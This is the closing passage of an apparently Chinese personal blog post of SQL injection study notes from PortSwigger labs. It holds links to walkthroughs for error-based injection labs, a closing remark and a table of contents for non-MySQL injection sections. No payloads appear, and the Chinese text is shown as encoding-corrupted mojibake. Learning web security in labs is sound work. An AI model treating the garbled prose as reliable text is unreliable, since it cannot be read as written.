<h1 id="sqlæŠ¥é”™æ³¨å…¥"><a href="#sqlæŠ¥é”™æ³¨å…¥" class="headerlink" title="sqlæŠ¥é”™æ³¨å…¥"></a>sqlæŠ¥é”™æ³¨å…¥</h1><p>æŠ¥é”™æ³¨å…¥ä¹ŸåŒæ ·è·³è¿‡å§ï¼Œæš‚æ—¶ç”¨ä¸åˆ°</p>
<p>å¦‚æœé‡åˆ°äº†é‚£ä¹ˆbpå®˜æ–¹çš„wtå°±æ˜¯éå¸¸è¯¦ç»†äº†</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">é¶åœºVisible error-based SQL injectionçš„wtï¼š<br>https://portswigger.net/web-security/sql-injection/blind/lab-sql-injection-visible-error-based<br><br>é¶åœºBlind SQL injection with conditional errorsçš„wtï¼š<br>https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors<br></code></pre></td></tr></table></figure>

<h1 id="æœ€å"><a href="#æœ€å" class="headerlink" title="æœ€å"></a>æœ€å</h1><p>è¿™ç¯‡æ–‡ç« ä»…ä»…åªæ˜¯è®°å½•äº†sqlæ³¨å…¥çš„éƒ¨åˆ†ï¼Œå‰©ä¸‹çš„é¶åœºéƒ½å·²ç»åœ¨å…¶ä»–çš„é¶åœºå­¦ä¹ è¿‡ä¾¿ä¸è®°å½•äº†</p>
<p>è¿™ç¯‡æ–‡ç« çš„ä¸»è¦å†…å®¹å°±æ˜¯MySQLä¹‹å¤–çš„æ•°æ®åº“ç±»å‹çš„åŸºæœ¬æ³¨å…¥è¯­å¥ï¼Œç»™æœªæ¥çš„æˆ‘æˆ–ä¸ºæ•°ä¸å¤šçš„è¯»è€…ä¸€ä¸ªå‚è€ƒï¼</p>
<div id="paginator"></div></div><div id="post-footer"><div id="pages"><div class="footer-link" style="width: 50%;text-align:right;border-right:1px #fe2 solid"><a href="/2023/07/28/XXE%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">â† Next XXEæ³¨å…¥å­¦ä¹ ç¬”è®°</a></div><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/2023/07/05/%E5%90%84%E7%A7%8D%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B1%BB%E5%9E%8Bsql%E6%B3%A8%E5%85%A5/">å„ç§æ•°æ®åº“ç±»å‹sqlæ³¨å…¥ Prev â†’</a></div></div></div><div id="comments"><div class="selector"><button class="valine-sel"></button></div><div id="valine"></div></div></div><div class="bottom-btn"><div><a id="to-top" onClick="scrolls.scrolltop();" title="To Top" style="opacity: 0; display: none;">âˆ§</a><a id="to-index" href="#toc-div" title="To Catalog">â‰¡</a><a id="color-mode" onClick="colorMode.change()" title="Change Theme"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="./img/logo.jpg" alt="Logo"></a><h1 id="Dr"><a href="/">Vincent</a></h1><div id="description"><p>ä¸ä¸æ— è°“äººäº‰æ°”</p></div></div><div id="aside-block"><div id="toc-div"><h1>Catalog</h1><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#postgresql%E6%B3%A8%E5%85%A5"><span class="toc-number">1.</span> <span class="toc-text">postgresqlæ³¨å…¥</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%99%BB%E5%BD%95%E6%A1%86sql%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87"><span class="toc-number">2.</span> <span class="toc-text">ç™»å½•æ¡†sqlæ³¨å…¥ç»•è¿‡</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#orancle%E6%B3%A8%E5%85%A5"><span class="toc-number">3.</span> <span class="toc-text">orancleæ³¨å…¥</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#mysql%E6%B3%A8%E5%85%A5"><span class="toc-number">4.</span> <span class="toc-text">mysqlæ³¨å…¥</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#postgresql%E6%B3%A8%E5%85%A52"><span class="toc-number">5.</span> <span class="toc-text">postgresqlæ³¨å…¥2</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#orancle%E6%B3%A8%E5%85%A52"><span class="toc-number">6.</span> <span class="toc-text">orancleæ³¨å…¥2</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#sql%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5"><span class="toc-number">7.</span> <span class="toc-text">sqlè”åˆæ³¨å…¥</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#sql%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A52"><span class="toc-number">8.</span> <span class="toc-text">sqlè”åˆæ³¨å…¥2</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#sql%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A53"><span class="toc-number">9.</span> <span class="toc-text">sqlè”åˆæ³¨å…¥3</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#sql%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A54"><span class="toc-number">10.</span> <span class="toc-text">sqlè”åˆæ³¨å…¥4</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#sql%E7%9B%B2%E6%B3%A8"><span class="toc-number">11.</span> <span class="toc-text">sqlç›²æ³¨</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#sql%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">12.</span> <span class="toc-text">sqlæŠ¥é”™æ³¨å…¥</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%9C%80%E5%90%8E"><span class="toc-number">13.</span> <span class="toc-text">æœ€å</span></a></li></ol></div></div><footer><nobr>Published with <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> Theme <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr>by <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plus</a></nobr></footer></aside></main><canvas id="canvas-dust"></canvas><script src="/js/search.js"></script><script src="/js/arknights.js"></script><script src="//unpkg.com/lightgallery@2.7.1/lightgallery.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/zoom/lg-zoom.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="/js/pjax.js"></script><script class="pjax-js">reset= () => {new Valine({
 el: '#valine'
 , appId: 'HPascq2qxfVnEiu0BvuEltaD-gzGzoHsz'
 , appKey: 'AKHEZyHQcEOLkAQk07kDBYgN' , placeholder: 'This comment is sent by Penguin Logistics.'
 , path: window.location.pathname
});code.findCode();
document.querySelector('.lg-container')?.remove()
lightGallery(document.getElementById('post-bg'), {
  plugins: [lgZoom,lgThumbnail],
  selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
 cacheBust: false,
 selectors: ['title','article','#aside-block','.pjax-js'],
 switches: {'article': Pjax.switches.sideBySide},
 switchesOptions: {
   'article': {
     classNames: {
       remove: "pjax-out",
       add: "pjax-in"
     }
   }
 }
});
document.addEventListener("pjax:complete", reset);reset()})</script></body></html>